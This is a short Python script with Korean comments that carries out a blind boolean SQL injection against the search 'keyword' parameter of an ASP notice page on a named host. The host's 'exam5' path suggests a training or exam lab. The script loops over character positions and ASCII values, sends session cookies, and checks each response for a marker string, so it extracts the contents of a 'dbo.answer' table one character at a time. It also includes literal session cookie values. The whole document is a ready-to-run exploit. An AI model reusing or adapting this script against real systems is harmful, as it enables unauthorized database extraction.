import requests

url = 'http://elms.skinfosec.co.kr:8081/exam5/notice.asp'
# Cookie 값은 로그인 후 변경 필요
cookie = {'ASPSESSIONIDCAAQTTBB': 'DEIJIGADOCCJKFBFLIBIEPCH', 'StudyMode': 'Process', 'ASPEXAMFIXATION': '8c5QwmH6Jd3', 'ContentType': 'C', 'ASPFIXATION': '54vRGYc7AL5'}

# 쿼리문 탐색
# aaa' AND ASCII(SUBSTRING((SELECT * FROM dbo.answer),1,1)) < 130 AND '%1%'='%1

def find_target():

    find_value = ""

    for i in range(5):
        
        for ascii in range(48, 122):
            param = {"keyword": "aaa' AND ASCII(SUBSTRING((SELECT * FROM dbo.answer),{},1)) = {} AND '%1%'='%1".format(i+1, ascii), "page": "", "board_id": "", "sorting": "", "sortingAd": "", "startDt": "", "endDt": "", "searchType": "all"}
            print(param)
            # GET방식으로 전송하므로 requests.get로 전달해야 한다.
            Send = requests.get(url, params = param, cookies = cookie)
            if "AAAAAAAAAAAAAAAAAAAAAAAAAAA" in Send.text:
                print("user의 값은: ",chr(ascii))
                find_value += chr(ascii)
                break
            print("값을 찾고있습니다!",chr(ascii))
    print("User의 이름은:", find_value, "입니다.")

find_target()
             

        


